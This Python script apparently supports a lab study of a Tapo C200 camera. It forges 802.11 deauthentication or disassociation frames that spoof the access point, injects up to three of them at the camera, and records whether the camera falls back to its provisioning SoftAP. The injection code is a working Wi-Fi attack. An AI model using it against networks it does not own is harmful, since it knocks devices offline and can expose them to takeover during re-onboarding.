#!/usr/bin/env python3
"""Bounded 802.11 S1 trial helper for an owned Tapo C200 V5 lab.

Run from Linux/WSL with a dedicated Wi-Fi adapter already placed in monitor mode.
The tool deliberately caps injection at 3 management frames per trial and writes
small evidence artifacts for causal analysis.
"""

from __future__ import annotations

import argparse
import json
import re
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

from scapy.all import (  # type: ignore
    AsyncSniffer,
    Dot11,
    Dot11Beacon,
    Dot11Deauth,
    Dot11Disas,
    Dot11Elt,
    RadioTap,
    sendp,
    wrpcap,
)

MAC_RE = re.compile(r"^(?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$")


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat()


def normalize_mac(value: str) -> str:
    value = value.strip().lower()
    if not MAC_RE.fullmatch(value):
        raise argparse.ArgumentTypeError(f"invalid MAC address: {value}")
    return value


def ssid_from_beacon(pkt) -> str | None:
    if not pkt.haslayer(Dot11Beacon):
        return None
    elt = pkt.getlayer(Dot11Elt)
    while elt is not None:
        if getattr(elt, "ID", None) == 0:
            raw = bytes(getattr(elt, "info", b""))
            return raw.decode("utf-8", errors="replace")
        elt = elt.payload.getlayer(Dot11Elt)
    return None


def packet_mentions_mac(pkt, mac: str) -> bool:
    if not pkt.haslayer(Dot11):
        return False
    return mac in {
        str(getattr(pkt, "addr1", "")).lower(),
        str(getattr(pkt, "addr2", "")).lower(),
        str(getattr(pkt, "addr3", "")).lower(),
        str(getattr(pkt, "addr4", "")).lower(),
    }


def build_frame(action: str, camera_mac: str, ap_bssid: str, reason: int):
    dot11 = Dot11(
        type=0,
        addr1=camera_mac,
        addr2=ap_bssid,
        addr3=ap_bssid,
    )
    if action == "deauth":
        return RadioTap() / dot11 / Dot11Deauth(reason=reason)
    if action == "disassoc":
        return RadioTap() / dot11 / Dot11Disas(reason=reason)
    raise ValueError(f"unsupported action: {action}")


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Bounded S1 802.11 trial")
    p.add_argument("--iface", required=True, help="monitor-mode interface, e.g. wlan1")
    p.add_argument("--camera-mac", required=True, type=normalize_mac)
    p.add_argument("--ap-bssid", type=normalize_mac)
    p.add_argument("--action", choices=("observe", "deauth", "disassoc"), default="observe")
    p.add_argument("--count", type=int, default=1, help="1..3 injected frames maximum")
    p.add_argument("--reason", type=int, default=3, help="802.11 reason code (default: 3)")
    p.add_argument("--observe-seconds", type=int, default=45)
    p.add_argument("--pre-seconds", type=int, default=3)
    p.add_argument("--out", required=True)
    args = p.parse_args()

    if not 1 <= args.count <= 3:
        p.error("--count must be between 1 and 3")
    if not 10 <= args.observe_seconds <= 300:
        p.error("--observe-seconds must be between 10 and 300")
    if not 0 <= args.pre_seconds <= 30:
        p.error("--pre-seconds must be between 0 and 30")
    if not 0 <= args.reason <= 65535:
        p.error("--reason must be between 0 and 65535")
    if args.action != "observe" and not args.ap_bssid:
        p.error("--ap-bssid is required for deauth/disassoc")
    return args


def main() -> int:
    args = parse_args()
    out_dir = Path(args.out)
    out_dir.mkdir(parents=True, exist_ok=True)

    kept_packets = []
    tapo_softaps: dict[str, dict[str, str | None]] = {}
    camera_frames = 0

    def on_packet(pkt) -> None:
        nonlocal camera_frames
        keep = False

        if packet_mentions_mac(pkt, args.camera_mac):
            camera_frames += 1
            keep = True

        ssid = ssid_from_beacon(pkt)
        if ssid and ssid.startswith("Tapo_Cam"):
            bssid = str(getattr(pkt, "addr2", "unknown"))
            tapo_softaps[bssid] = {
                "ssid": ssid,
                "bssid": bssid,
                "first_seen_utc": tapo_softaps.get(bssid, {}).get("first_seen_utc") or utc_now(),
            }
            keep = True
            print(f"[!] Tapo provisioning SoftAP seen: {ssid} ({bssid})", flush=True)

        if keep:
            kept_packets.append(pkt)

    started_utc = utc_now()
    injection_utc: str | None = None

    print(f"[+] iface={args.iface} action={args.action} camera={args.camera_mac}")
    print(f"[+] pre-observation={args.pre_seconds}s post-observation={args.observe_seconds}s")

    sniffer = AsyncSniffer(iface=args.iface, prn=on_packet, store=False)
    sniffer.start()

    try:
        if args.pre_seconds:
            time.sleep(args.pre_seconds)

        if args.action != "observe":
            frame = build_frame(args.action, args.camera_mac, args.ap_bssid, args.reason)
            injection_utc = utc_now()
            print(
                f"[+] injecting {args.count} {args.action} frame(s) AP={args.ap_bssid} -> camera={args.camera_mac}",
                flush=True,
            )
            sendp(frame, iface=args.iface, count=args.count, inter=0.30, verbose=False)

        time.sleep(args.observe_seconds)
    finally:
        sniffer.stop()

    ended_utc = utc_now()
    pcap_path = out_dir / "radio-evidence.pcap"
    summary_path = out_dir / "summary.json"

    if kept_packets:
        wrpcap(str(pcap_path), kept_packets)

    summary = {
        "started_utc": started_utc,
        "injection_utc": injection_utc,
        "ended_utc": ended_utc,
        "iface": args.iface,
        "camera_mac": args.camera_mac,
        "ap_bssid": args.ap_bssid,
        "action": args.action,
        "count": 0 if args.action == "observe" else args.count,
        "reason": None if args.action == "observe" else args.reason,
        "pre_seconds": args.pre_seconds,
        "observe_seconds": args.observe_seconds,
        "camera_frames_kept": camera_frames,
        "kept_packet_count": len(kept_packets),
        "softap_seen": bool(tapo_softaps),
        "softaps": list(tapo_softaps.values()),
        "pcap": str(pcap_path) if kept_packets else None,
        "classification_hint": "softap/re-onboarding candidate" if tapo_softaps else "no Tapo_Cam_* beacon observed",
    }
    summary_path.write_text(json.dumps(summary, indent=2) + "\n", encoding="utf-8")

    print(f"[+] summary: {summary_path}")
    if kept_packets:
        print(f"[+] pcap:    {pcap_path}")
    print(f"[+] softap_seen={summary['softap_seen']} camera_frames={camera_frames}")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except PermissionError:
        print("[-] permission denied: run this script through sudo/root inside WSL", file=sys.stderr)
        raise SystemExit(2)
